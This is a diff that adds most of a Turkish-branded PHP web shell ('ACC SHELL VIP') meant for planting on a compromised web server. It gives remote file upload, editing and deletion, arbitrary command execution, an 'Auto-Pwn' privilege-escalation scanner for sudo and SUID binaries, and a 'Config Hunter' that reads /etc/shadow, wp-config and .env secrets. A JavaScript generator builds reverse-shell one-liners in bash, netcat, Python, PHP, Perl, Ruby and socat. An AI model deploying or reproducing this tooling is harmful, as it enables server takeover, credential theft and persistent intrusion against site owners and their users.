+    if (isset($_POST["upload"])) { if(isset($_FILES["fileToUpload"]) && $_FILES["fileToUpload"]["error"] == UPLOAD_ERR_OK) { $target_file = PATH . "/" . basename($_FILES["fileToUpload"]["name"]); if (!@is_writable(PATH)) { $_SESSION['message']='Hata: Dizin ('.htmlspecialchars(PATH).') yazılamıyor!'; $_SESSION['message_type']='error'; } elseif (@move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) { $_SESSION['message'] = htmlspecialchars(basename($_FILES["fileToUpload"]["name"])).' yüklendi!'; $_SESSION['message_type']='success'; } else { $upload_error = $_FILES["fileToUpload"]["error"]; $_SESSION['message']='Hata: Yüklenemedi! (Error: '.$upload_error.')'; $_SESSION['message_type']='error'; } } else { $upload_error = isset($_FILES["fileToUpload"]["error"]) ? $_FILES["fileToUpload"]["error"] : 'Unknown'; $php_upload_errors = array( UPLOAD_ERR_INI_SIZE=>'php.ini size limit', UPLOAD_ERR_FORM_SIZE=>'Form size limit', UPLOAD_ERR_PARTIAL=>'Partial upload', UPLOAD_ERR_NO_FILE=>'No file', UPLOAD_ERR_NO_TMP_DIR=>'No tmp dir', UPLOAD_ERR_CANT_WRITE=>'Cannot write', UPLOAD_ERR_EXTENSION=>'PHP Extension stop'); $error_message = isset($php_upload_errors[$upload_error]) ? $php_upload_errors[$upload_error] : 'Unknown upload error.'; $_SESSION['message'] = 'Hata: ' . $error_message . ' (Code: ' . $upload_error . ')'; $_SESSION['message_type']='error'; } header('Location: ?p=' . urlencode(encodePath(PATH))); exit; }
+    elseif (isset($_POST['rename'])) { $original_path = PATH . "/" . $_POST['original_name']; $new_path = PATH . "/" . $_POST['new_name']; if (!file_exists($original_path)) { $msg='Hata: Orijinal bulunamadı!'; $type='error'; } elseif ($original_path === $new_path) { $msg='İsimler aynı!'; $type='info'; } elseif (@rename($original_path, $new_path)) { $msg='Yeniden adlandırıldı!'; $type='success'; } else { $msg='Hata: Adlandırılamadı! İzin?'; $type='error'; } $_SESSION['message'] = $msg; $_SESSION['message_type'] = $type; header('Location: ?p=' . urlencode(encodePath(PATH))); exit; }
+    elseif(isset($_POST['edit'])) { $filename = PATH."/".$_POST['file_to_save']; if (!is_writable($filename)) { $msg='Hata: Hala yazılamıyor!'; $type='error'; } else { $data = $_POST['data']; if(@file_put_contents($filename, $data) !== false) { $msg='Kaydedildi!'; $type='success'; } else { $msg='Hata: Kaydedilemedi!'; $type='error'; } } $_SESSION['message'] = $msg; $_SESSION['message_type'] = $type; header('Location: ?p=' . urlencode(encodePath(PATH))); exit; }
+    elseif(isset($_POST['run_command'])) { $cmd = $_POST['command']; $cmd_result = runCommand($cmd); $action_result_output = $cmd_result['output']; }
+    elseif(isset($_POST['analyze_system'])) { $analysis_output = "--- OS/Kernel Info ---\n"; $analysis_output .= runCommand('uname -a')['output'] . "\n"; $os_release = @file_get_contents('/etc/os-release'); $analysis_output .= ($os_release ?: runCommand('cat /etc/issue')['output']) . "\n"; $analysis_output .= "--- Sudo Version ---\n"; $analysis_output .= runCommand('sudo -V 2>&1')['output'] . "\n"; $analysis_output .= "--- SUID Binaries ---\n"; $analysis_output .= runCommand('find / -perm -4000 -type f -ls 2>/dev/null')['output'] . "\n"; $analysis_output .= "\n--- SUGGESTIONS ---\n"; $analysis_output .= "* Check kernel on exploit-db / searchsploit.\n"; $analysis_output .= "* Check sudo version for vulns (e.g., Baron Samedit).\n"; $analysis_output .= "* Analyze SUID bins using GTFOBins.\n"; $analysis_output .= "* Run 'sudo -l'.\n"; $action_result_output = $analysis_output; }
+    elseif(isset($_POST['attempt_autopwn'])) { $pwn_output = "--- Attempting Auto-Pwn --- \n"; $pwn_output .= "[+] Checking 'sudo -l'...\n"; $sudo_l = runCommand('sudo -l 2>&1')['output']; $pwn_output .= $sudo_l . "\n"; if (stripos($sudo_l, 'NOPASSWD:') !== false && stripos($sudo_l, 'may run the following commands') !== false) { $pwn_output .= "[!] Potential NOPASSWD sudo found! Check allowed commands!\n"; } else { $pwn_output .= "[-] No obvious NOPASSWD sudo found.\n"; } $pwn_output .= "[+] Checking common SUID exploits (basic)...\n"; $suid_bins = array('nmap','find','vim','cp','mv','bash','more','less','nano','awk'); foreach($suid_bins as $bin) { $find_cmd = "find / -name ".$bin." -perm -4000 -type f -print 2>/dev/null"; $found = runCommand($find_cmd)['output']; if (!empty($found)) { $pwn_output .= "[!] Found SUID binary: ".$found." (Check GTFOBins for '".$bin."')\n"; } } $pwn_output .= "[-] Basic SUID checks finished.\n"; $pwn_output .= "\n--- Auto-Pwn Attempt Finished --- \n"; $action_result_output = $pwn_output; }
+} // POST sonu
+
+?>
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ACC SHELL VİP<?php echo $SHELL_VERSION; ?> [SECURE]</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12"></script>
+    <style>
+        /* --- KAOS CSS --- */
+         @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap');
+        :root { --bg-color: #0a0a0a; --terminal-bg: #1a1a1a; --text-color: #00ff00; --header-color: #ff003c; --link-color: #00ffff; --link-hover: #ffffff; --border-color: #333; --icon-color: #ff003c; --button-bg: #ff003c; --button-text: #000; --button-hover-bg: #ff4d6d; --table-header-bg: #2a2a2a; --code-bg: #050505; --hacker-font: 'Fira Code', monospace; --perms-color: #aaaaaa; }
+        body { background-color: var(--bg-color); color: var(--text-color); font-family: var(--hacker-font); margin: 0; padding: 0; font-size: 14px; line-height: 1.6; overflow-x: hidden; }
+        .container-fluid { padding: 15px; max-width: 1600px; margin: 0 auto; }
+        .hacker-nav { background-color: var(--terminal-bg); border-bottom: 2px solid var(--header-color); padding: 8px 15px; margin-bottom: 15px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; }
+        .navbar-brand { color: var(--header-color); font-weight: bold; font-size: 1.3em; text-shadow: 0 0 5px var(--header-color); } .navbar-brand i { margin-right: 8px; }
+        .navbar-brand a, .breadcrumb a { color: var(--link-color); text-decoration: none; margin: 0 2px; } .navbar-brand a:hover, .breadcrumb a:hover { color: var(--link-hover); text-decoration: underline; }
+        .breadcrumb { background: var(--terminal-bg); padding: 8px 12px; margin-bottom:15px; border: 1px solid var(--border-color); border-radius: 3px; word-break: break-all; color: var(--text-color); font-size: 0.9em; } .breadcrumb i { margin-right: 5px; color: var(--header-color); }
+        .hacker-controls a button, .hacker-controls input[type="submit"], .quick-cmd-btn, .action-btn, .config-btn { background-color: var(--button-bg); color: var(--button-text); border: none; padding: 4px 8px; margin-left: 8px; cursor: pointer; font-family: var(--hacker-font); font-weight: bold; transition: background-color 0.3s ease; border-radius: 3px; font-size: 0.85em; margin-bottom: 5px; }
+        .hacker-controls a button:hover, .hacker-controls input[type="submit"]:hover, .quick-cmd-btn:hover, .action-btn:hover, .config-btn:hover { background-color: var(--button-hover-bg); } .hacker-controls i { margin-right: 4px;}
+        .hacker-table { width: 100%; border-collapse: collapse; margin-top: 15px; background-color: var(--terminal-bg); border: 1px solid var(--border-color); box-shadow: 0 0 10px rgba(255, 0, 60, 0.2); }
+        .hacker-table th, .hacker-table td { border: 1px solid var(--border-color); padding: 6px 10px; text-align: left; vertical-align: middle; word-break: break-all; font-size: 0.9em; }
+        .hacker-table th { background-color: var(--table-header-bg); color: var(--header-color); font-weight: bold; }
+        .hacker-table tr:nth-child(even) { background-color: rgba(0, 255, 0, 0.03); } .hacker-table tr:hover { background-color: rgba(0, 255, 255, 0.08); }
+        .hacker-table td a { color: var(--link-color); text-decoration: none; margin-right: 6px; display: inline-block; position: relative; } .hacker-table td a:hover { color: var(--link-hover); }
+        .hacker-table td a .tooltiptext { visibility: hidden; width: 80px; background-color: #555; color: #fff; text-align: center; border-radius: 6px; padding: 5px 0; position: absolute; z-index: 1; bottom: 125%; left: 50%; margin-left: -40px; opacity: 0; transition: opacity 0.3s; font-size: 0.8em; } .hacker-table td a:hover .tooltiptext { visibility: visible; opacity: 1; }
+        .hacker-icon-folder { color: #ffff00; } .hacker-icon-error { color: #ff4d4d; } .hacker-icon-config { color: #cccccc; } .hacker-icon-code { color: #66ccff; } .hacker-icon-image { color: #cc99ff; } .hacker-icon-audio { color: #ff99cc; } .hacker-icon-video { color: #ffcc66; } .hacker-icon-text { color: #ffffff; } .hacker-icon-archive { color: #99ff99; } .hacker-icon-doc { color: #ffad33; } .hacker-icon-default { color: var(--text-color); } .hacker-icon-lock { color: #f0ad4e; } .hacker-icon-anchor { color: #d9534f; }
+        .perms { color: var(--perms-color); font-size: 0.9em; cursor: help; }
+        form { margin-bottom: 15px; }
+        .form-section { background-color: var(--terminal-bg); padding: 15px; margin-top: 15px; border: 1px solid var(--border-color); border-radius: 5px; } .form-section h3 { font-size: 1.1em; margin-bottom: 10px; color: var(--header-color);}
+        input[type="file"], input[type="text"], textarea, select { background-color: var(--code-bg); color: var(--text-color); border: 1px solid var(--border-color); padding: 6px; margin: 4px 0; width: calc(100% - 18px); font-family: var(--hacker-font); border-radius: 3px; font-size: 0.9em; }
+        textarea { min-height: 250px; resize: vertical; } select { width: auto; }
+        .message { padding: 8px 12px; margin: 12px 0; border-radius: 3px; font-weight: bold; border: 1px solid transparent; font-size: 0.9em;} .message.success { background-color: rgba(0, 255, 0, 0.1); border-color: var(--text-color); color: var(--text-color); text-shadow: 0 0 3px var(--text-color); } .message.error { background-color: rgba(255, 0, 60, 0.1); border-color: var(--header-color); color: var(--header-color); text-shadow: 0 0 3px var(--header-color); } .message i { margin-right: 6px; }
+        .command-section, .collapsible-section { background-color: var(--terminal-bg); border: 1px solid var(--border-color); padding: 15px; margin-top: 20px; border-radius: 5px; }
+        .collapsible-section summary { color: var(--header-color); font-size: 1.1em; margin-bottom: 10px; cursor: pointer; font-weight: bold; list-style: none; }
+        .collapsible-section summary::-webkit-details-marker { display: none; }
+        .collapsible-section summary::before { content: '\f078'; font-family: 'Font Awesome 6 Free'; font-weight: 900; margin-right: 8px; display: inline-block; transition: transform 0.2s; }
+        .collapsible-section[open] summary::before { transform: rotate(-180deg); }
+        .collapsible-section[open] summary { border-bottom: 1px solid var(--header-color); padding-bottom: 5px; }
+        .command-section h3, .collapsible-section h4 { color: var(--header-color); font-size: 1.1em; margin-bottom: 10px; }
+        .command-form { display: flex; margin-bottom: 10px;} .command-form input[type="text"] { flex-grow: 1; margin-right: 10px; }
+        .quick-cmd-buttons button, .config-btn { margin-right: 5px; margin-bottom: 5px;}
+        pre.command-output, pre.info-output { background-color: var(--code-bg); color: var(--text-color); border: 1px solid var(--border-color); padding: 10px; margin-top: 10px; border-radius: 3px; white-space: pre-wrap; word-wrap: break-word; max-height: 400px; overflow-y: auto; font-size: 0.9em; }
+        .hacker-footer { text-align: center; margin-top: 30px; padding: 10px; color: #555; font-size: 0.85em; border-top: 1px solid var(--border-color); } .hacker-footer a { color: var(--link-color); text-decoration: none; } .hacker-footer a:hover { color: var(--link-hover); }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } } @keyframes glow { 0% { text-shadow: 0 0 3px var(--header-color), 0 0 5px var(--header-color); } 50% { text-shadow: 0 0 8px var(--header-color), 0 0 15px var(--header-color); } 100% { text-shadow: 0 0 3px var(--header-color), 0 0 5px var(--header-color); } }
+        .navbar-brand span { animation: glow 2.5s infinite alternate; } body { animation: fadeIn 0.8s ease-out; }
+        @media (max-width: 768px) { .hacker-nav { flex-direction: column; align-items: flex-start;} .hacker-controls { margin-top: 10px; width: 100%; text-align: right;} .hacker-table th, .hacker-table td { padding: 5px 6px; font-size: 0.85em;} .hacker-table td a { margin-right: 4px;} textarea { min-height: 200px; } .hacker-table td:nth-child(2), .hacker-table th:nth-child(2), .hacker-table td:nth-child(3), .hacker-table th:nth-child(3) { display: none; } .command-form { flex-direction: column;} .command-form input[type="text"] { margin-right: 0; margin-bottom: 5px;} }
+    </style>
+</head>
+<body>
+    <div class="container-fluid">
+
+        <nav class="hacker-nav">
+             <div class="navbar-brand">
+                 <i class="fas fa-meteor"></i>
+                 <span id="shell-title"></span>
+             </div>
+             <div class="hacker-controls">
+                 <a href="?upload=1&p=<?php echo urlencode(encodePath(PATH)); ?>"><button type="button"><i class="fas fa-upload"></i> Upload</button></a>
+                 <a href="?p=<?php echo encodePath('/'); ?>"><button type="button"><i class="fas fa-broadcast-tower"></i> ROOT</button></a>
+                 <a href="?p=<?php echo urlencode(encodePath($doc_root)); ?>"><button type="button"><i class="fas fa-sitemap"></i> WebRoot</button></a>
+             </div>
+        </nav>
+
+        <div class="breadcrumb">
+            <i class="fas fa-folder"></i> Path: <?php $path_for_breadcrumb = PATH; $path_for_breadcrumb = str_replace('\\', '/', $path_for_breadcrumb); if (empty($path_for_breadcrumb) || $path_for_breadcrumb === '/') { echo "<a href=\"?p=" . encodePath('/') . "\">/</a>"; } else { $paths = explode('/', $path_for_breadcrumb); $current_built_path = ''; $is_windows_path = preg_match('/^[a-zA-Z]:$/', isset($paths[0]) ? $paths[0] : ''); foreach ($paths as $id => $dir_part) { if ($dir_part === '' && $id === 0 && !$is_windows_path) { $current_built_path = '/'; echo "<a href=\"?p=" . encodePath($current_built_path) . "\">/</a>"; continue; } if ($is_windows_path && $id === 0) { $current_built_path = $dir_part . '/'; echo "<a href=\"?p=" . encodePath($current_built_path) . "\">" . htmlspecialchars($dir_part) . "</a>/"; continue; } if ($dir_part === '') continue; if ($current_built_path === '/' || preg_match('/\/$/', $current_built_path)) { $current_built_path .= $dir_part; } else { $current_built_path .= '/' . $dir_part; } echo "<a href='?p=" . encodePath($current_built_path) . "'>" . htmlspecialchars($dir_part) . "</a>/"; } } ?>
+        </div>
+
+        <?php if (!empty($message)): echo '<div class="message '.$message_type.'"><i class="fas fa-info-circle"></i> '.$message.'</div>'; endif; ?>
+
+        <?php
+        // --- Ana İçerik Alanı ---
+        $show_file_manager = true;
+        if (isset($_GET['upload']) || (isset($_GET['r']) && isset($_GET['file'])) || (isset($_GET['e']) && isset($_GET['file']))) {
+             if (isset($_GET['upload'])) { echo '<div class="form-section"><h3><i class="fas fa-upload"></i> Upload to ' . htmlspecialchars(PATH) . '</h3><form method="post" enctype="multipart/form-data" action="?p='.urlencode(encodePath(PATH)).'"><input type="file" name="fileToUpload" id="fileToUpload" required><input type="submit" class="action-btn" value="Upload!" name="upload"></form></div>'; }
+             elseif (isset($_GET['r']) && isset($_GET['file'])) { $item_to_rename = urldecode($_GET['file']); echo '<div class="form-section"><h3><i class="fas fa-edit"></i> Rename: ' . htmlspecialchars($item_to_rename). '</h3><form method="post" action="?p='.urlencode(encodePath(PATH)).'"><input type="hidden" name="original_name" value="' . htmlspecialchars($item_to_rename) . '">New Name:<input type="text" name="new_name" value="' . htmlspecialchars($item_to_rename) . '" required><input type="submit" class="action-btn" value="Rename!" name="rename"></form></div>'; }
+             elseif (isset($_GET['e']) && isset($_GET['file'])) { $file_to_edit = urldecode($_GET['file']); $file_path = PATH . "/" . $file_to_edit; echo '<div class="form-section">'; if (!is_file($file_path)) { echo '<div class="message error">Hata: Dosya değil!</div>'; } elseif (!is_readable($file_path)) { echo '<div class="message error">Hata: Okunamıyor!</div>'; } elseif (!is_writable($file_path)) { echo '<div class="message error">Uyarı: Yazılamıyor!</div>'; $content = htmlspecialchars(@file_get_contents($file_path) ?: ''); echo '<h4><i class="fas fa-eye"></i> Viewing: ' . htmlspecialchars($file_to_edit) . '</h4><textarea readonly style="background-color: #101010;">' . $content . '</textarea>'; } else { $content = htmlspecialchars(@file_get_contents($file_path) ?: ''); echo '<form method="post" action="?p='.urlencode(encodePath(PATH)).'"><h3 style="color: var(--header-color);"><i class="fas fa-file-pen"></i> Editing: ' . htmlspecialchars($file_to_edit) . '</h3><textarea name="data">' . $content . '</textarea><br><input type="hidden" name="file_to_save" value="' . htmlspecialchars($file_to_edit) . '"><input type="submit" class="action-btn" value="Save Changes!" name="edit"></form>'; } echo '</div>'; }
+             $show_file_manager = false;
+        }
+
+        // Dosya Yöneticisi
+        if ($show_file_manager) {
+            if (!is_dir(PATH)) { echo '<div class="message error"><i class="fas fa-exclamation-triangle"></i> Hata: Dizin değil! Path: ' . htmlspecialchars(PATH) . '</div>'; }
+            elseif (!($scan = @scandir(PATH))) { echo '<div class="message error"><i class="fas fa-exclamation-triangle"></i> Hata: Dizin okunamadı! (' . htmlspecialchars(PATH) . ')</div>'; }
+            else {
+                $folders = array(); $files = array(); foreach ($scan as $obj) { if ($obj == '.' || $obj == '..') continue; $full_obj_path = PATH . '/' . $obj; if (@is_dir($full_obj_path)) { array_push($folders, $obj); } else { array_push($files, $obj); } } usort($folders, 'strcoll'); usort($files, 'strcoll');
+                echo '<table class="hacker-table"><thead><tr><th>Name</th><th>Size</th><th>Modified</th><th>Perms</th><th>Actions</th></tr></thead><tbody>';
+                foreach ($folders as $folder) { $folder_path = PATH . "/" . $folder; $perms = @fileperms($folder_path); $perms_str = ($perms === false) ? '????' : substr(sprintf('%o', $perms), -4); $mtime = @filemtime($folder_path); $mtime_str = ($mtime === false) ? '???' : date("Y-m-d H:i:s", $mtime); $perms_readable = perms_to_string($perms); $file_encoded = urlencode($folder); $path_encoded_url = urlencode(encodePath(PATH)); echo "<tr><td>" . fileIcon($folder) . "<a href='?p=" . urlencode(encodePath($folder_path)) . "'>" . htmlspecialchars($folder) . "</a></td><td><b>[DIR]</b></td><td>" . $mtime_str . "</td><td><span class='perms' title='" . $perms_readable . "'>" . $perms_str . "</span></td><td><a title='Edit' href='#' onclick='alert(\"Klasör!\"); return false;'><i class='fas fa-file-pen' style='opacity:0.3;'></i></a> <a title='Rename' href='?r=1&file=" . $file_encoded . "&p=" . $path_encoded_url . "'><i class='fas fa-edit'></i></a> <a title='Delete' href='?d=1&file=" . $file_encoded . "&p=" . $path_encoded_url . "' onclick='return confirm(\"Sil?\");'><i class='fas fa-trash'></i></a> <a title='Download' href='#' onclick='alert(\"Klasör!\"); return false;'><i class='fas fa-download' style='opacity:0.3;'></i></a> | <a title='Lock (0444)' href='?chmod=0444&file=" . $file_encoded . "&p=" . $path_encoded_url . "'><i class='fas fa-lock hacker-icon-lock'></i></a> <a title='Unlock (0755)' href='?chmod=0755&file=" . $file_encoded . "&p=" . $path_encoded_url . "'><i class='fas fa-unlock hacker-icon-lock'></i></a> | <a title='IMMUTABLE (+i)' href='?chattr=lock&file=" . $file_encoded . "&p=" . $path_encoded_url . "' onclick='return confirm(\"chattr +i?\");'><i class='fas fa-anchor hacker-icon-anchor'></i></a> <a title='Mutable (-i)' href='?chattr=unlock&file=" . $file_encoded . "&p=" . $path_encoded_url . "' onclick='return confirm(\"chattr -i?\");'><i class='fas fa-unlink hacker-icon-anchor'></i></a></td></tr>"; }
+                foreach ($files as $file) { $file_path = PATH . "/" . $file; $perms = @fileperms($file_path); $perms_str = ($perms === false) ? '????' : substr(sprintf('%o', $perms), -4); $size = @filesize($file_path); $size_str = ($size === false) ? '???' : formatSizeUnits($size); $mtime = @filemtime($file_path); $mtime_str = ($mtime === false) ? '???' : date("Y-m-d H:i:s", $mtime); $perms_readable = perms_to_string($perms); $file_encoded = urlencode($file); $path_encoded_url = urlencode(encodePath(PATH)); echo "<tr><td>" . fileIcon($file) . htmlspecialchars($file) . "</td><td>" . $size_str . "</td><td>" . $mtime_str . "</td><td><span class='perms' title='" . $perms_readable . "'>" . $perms_str . "</span></td><td><a title='Edit' href='?e=1&file=" . $file_encoded . "&p=" . $path_encoded_url . "'><i class='fas fa-file-pen'></i></a> <a title='Rename' href='?r=1&file=" . $file_encoded . "&p=" . $path_encoded_url . "'><i class='fas fa-edit'></i></a> <a title='Delete' href='?d=1&file=" . $file_encoded . "&p=" . $path_encoded_url . "' onclick='return confirm(\"Sil?\");'><i class='fas fa-trash'></i></a> <a title='Download' href='?dl=1&file=" . $file_encoded . "&p=" . $path_encoded_url . "'><i class='fas fa-download'></i></a> | <a title='Lock (0444)' href='?chmod=0444&file=" . $file_encoded . "&p=" . $path_encoded_url . "'><i class='fas fa-lock hacker-icon-lock'></i></a> <a title='Unlock (0644)' href='?chmod=0644&file=" . $file_encoded . "&p=" . $path_encoded_url . "'><i class='fas fa-unlock hacker-icon-lock'></i></a> | <a title='IMMUTABLE (+i)' href='?chattr=lock&file=" . $file_encoded . "&p=" . $path_encoded_url . "' onclick='return confirm(\"chattr +i?\");'><i class='fas fa-anchor hacker-icon-anchor'></i></a> <a title='Mutable (-i)' href='?chattr=unlock&file=" . $file_encoded . "&p=" . $path_encoded_url . "' onclick='return confirm(\"chattr -i?\");'><i class='fas fa-unlink hacker-icon-anchor'></i></a></td></tr>"; }
+                echo "</tbody></table>";
+            }
+        }
+        ?>
+
+        <!-- Komut Çalıştırma -->
+        <div class="command-section">
+             <h3><i class="fas fa-terminal"></i> Execute Command</h3>
+             <div class="quick-cmd-buttons">
+                 <button class="quick-cmd-btn" onclick="setCmd('whoami')">whoami</button>
+                 <button class="quick-cmd-btn" onclick="setCmd('id')">id</button>
+                 <button class="quick-cmd-btn" onclick="setCmd('uname -a')">uname -a</button>
+                 <button class="quick-cmd-btn" onclick="setCmd('ps aux')">ps aux</button>
+                 <button class="quick-cmd-btn" onclick="setCmd('netstat -tulnp')">netstat</button>
+             </div>
+             <form method="post" action="?p=<?php echo urlencode(encodePath(PATH)); ?>" class="command-form">
+                 <input type="text" id="command_input" name="command" placeholder="Enter command..." value="<?php echo isset($_POST['command']) ? htmlspecialchars($_POST['command']) : ''; ?>" required>
+                 <button type="submit" name="run_command" class="action-btn">Run!</button>
+             </form>
+             <?php if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['run_command']) && !empty($action_result_output)): ?>
+                 <h4>Output:</h4>
+                 <pre class="command-output"><?php echo $action_result_output; ?></pre>
+             <?php endif; ?>
+        </div>
+
+         <!-- Açılır/Kapanır Bölümler -->
+        <details class="collapsible-section" <?php echo ($_SERVER['REQUEST_METHOD'] === 'POST' && (isset($_POST['analyze_system']) || isset($_POST['attempt_autopwn']))) ? 'open' : ''; ?>>
+            <summary><i class="fas fa-shield-alt"></i> System Info & Exploit Helper</summary>
+            <div>
+                <form method="post" action="?p=<?php echo urlencode(encodePath(PATH)); ?>" style="display:inline-block;"> <button type="submit" name="analyze_system" class="action-btn">Analyze System</button> </form>
+                <form method="post" action="?p=<?php echo urlencode(encodePath(PATH)); ?>" style="display:inline-block;"> <button type="submit" name="attempt_autopwn" class="action-btn" style="background:#f0ad4e;color:#000;" onclick="return confirm('Auto-Pwn?')">Try Auto-Pwn!</button> </form>
+                <?php if (($_SERVER['REQUEST_METHOD'] === 'POST' && (isset($_POST['analyze_system']) || isset($_POST['attempt_autopwn'])) && !empty($action_result_output))): ?>
+                     <h4>Analysis / Attempt Result:</h4>
+                     <pre class="info-output"><?php echo $action_result_output; ?></pre>
+                     <p> <a href="https://www.exploit-db.com/" target="_blank" class="action-btn">Search Exploit-DB</a> <a href="https://gtfobins.github.io/" target="_blank" class="action-btn">Check GTFOBins</a> </p>
+                 <?php endif; ?>
+            </div>
+        </details>
+
+        <details class="collapsible-section"> <summary><i class="fas fa-satellite-dish"></i> Reverse Shell Helper</summary> <div> <form onsubmit="generateShell(event)"> Your IP: <input type="text" id="rev_ip" value="<?php echo htmlspecialchars($_SERVER['REMOTE_ADDR']); ?>" style="width:150px; display:inline-block; margin-right:10px;"> Port: <input type="text" id="rev_port" value="4444" style="width:80px; display:inline-block; margin-right:10px;"> Type: <select id="shell_type" style="background:var(--code-bg); color:var(--text-color); border:1px solid var(--border-color); padding: 4px;"> <option value="bash_tcp">Bash TCP</option> <option value="nc_e">Netcat -e</option> <option value="nc_mkfifo">Netcat mkfifo</option> <option value="python3">Python3</option> <option value="php">PHP</option> <option value="perl">Perl</option> <option value="ruby">Ruby</option> <option value="socat">Socat</option> </select> <button type="submit" class="action-btn">Generate!</button> </form> <pre id="generated_shell_output" class="command-output" style="margin-top:10px; display:none;"></pre> </div> </details>
+
+        <details class="collapsible-section" <?php echo ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['read_config']) && !empty($action_result_output)) ? 'open' : ''; ?>>
+             <summary><i class="fas fa-key"></i> Config Hunter</summary>
+             <div> <p>Attempt to read common configuration files:</p> <div class="quick-cmd-buttons"> <a href="?read_config=passwd&p=<?php echo urlencode(encodePath(PATH)); ?>"><button class="config-btn">/etc/passwd</button></a> <a href="?read_config=shadow&p=<?php echo urlencode(encodePath(PATH)); ?>"><button class="config-btn" style="background:#f0ad4e;color:#000;">/etc/shadow</button></a> <a href="?read_config=wpconfig&p=<?php echo urlencode(encodePath(PATH)); ?>"><button class="config-btn">wp-config (here)</button></a> <a href="?read_config=wpconfig_up&p=<?php echo urlencode(encodePath(PATH)); ?>"><button class="config-btn">wp-config (up)</button></a> <a href="?read_config=env&p=<?php echo urlencode(encodePath(PATH)); ?>"><button class="config-btn">.env (here)</button></a> <a href="?read_config=env_up&p=<?php echo urlencode(encodePath(PATH)); ?>"><button class="config-btn">.env (up)</button></a> <a href="?read_config=apache_conf&p=<?php echo urlencode(encodePath(PATH)); ?>"><button class="config-btn">apache2.conf</button></a> <a href="?read_config=nginx_conf&p=<?php echo urlencode(encodePath(PATH)); ?>"><button class="config-btn">nginx.conf</button></a> <a href="?read_config=php_ini&p=<?php echo urlencode(encodePath(PATH)); ?>"><button class="config-btn">php.ini</button></a> </div>
+                  <?php if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['read_config']) && !empty($action_result_output)): ?> <h4>Config Content:</h4> <pre class="info-output"><?php echo $action_result_output; ?></pre> <?php endif; ?>
+             </div>
+         </details>
+
+        <!-- Footer -->
+        <div class="hacker-footer"> <p>~~ ACC SHELL VIP <?php echo $SHELL_VERSION; ?> coded by <span style="color:var(--header-color); font-weight:bold;">acc</span> ~~</p> <p> <a href="/" target="_blank"><i class="fab fa-instagram"></i> Instagram: Berofc</a> </p> </div>
+
+    </div> <!-- container-fluid sonu -->
+    <script>
+        var typed = new Typed('#shell-title', { strings: ['ACC SHELL VIP <?php echo $SHELL_VERSION; ?>', 'SYSTEM_BREACHED_ALPHA', 'BEROFC_ONLINE', 'AWAITING_KAOS...^1000'], typeSpeed: 40, backSpeed: 25, loop: true, showCursor: true, cursorChar: '█', smartBackspace: true });
+        function setCmd(cmd) { document.getElementById('command_input').value = cmd; }
+        function generateShell(event) { event.preventDefault(); const ip = document.getElementById('rev_ip').value; const port = document.getElementById('rev_port').value; const type = document.getElementById('shell_type').value; let command = ''; if (!ip || !port) { alert('IP ve Port gir!'); return; } switch(type) { case 'bash_tcp': command = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`; break; case 'nc_e': command = `nc -e /bin/bash ${ip} ${port}`; break; case 'nc_mkfifo': command = `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ${ip} ${port} >/tmp/f`; break; case 'python3': command = `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'`; break; case 'php': command = `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/bash -i <&3 >&3 2>&3");'`; break; case 'perl': command = `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'`; break; case 'ruby': command = `ruby -rsocket -e'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'`; break; case 'socat': command = `socat tcp-connect:${ip}:${port} exec:/bin/bash,pty,stderr,setsid,sigint,sane`; break; default: command = 'Unknown type'; } const outputArea = document.getElementById('generated_shell_output'); outputArea.textContent = command; outputArea.style.display = 'block'; const selection = window.getSelection(); const range = document.createRange(); range.selectNodeContents(outputArea); selection.removeAllRanges(); selection.addRange(range); try { document.execCommand('copy'); alert('Komut kopyalandı!'); } catch(err) { alert('Manuel kopyala!'); } }
+    </script>
+</body>
+</html>
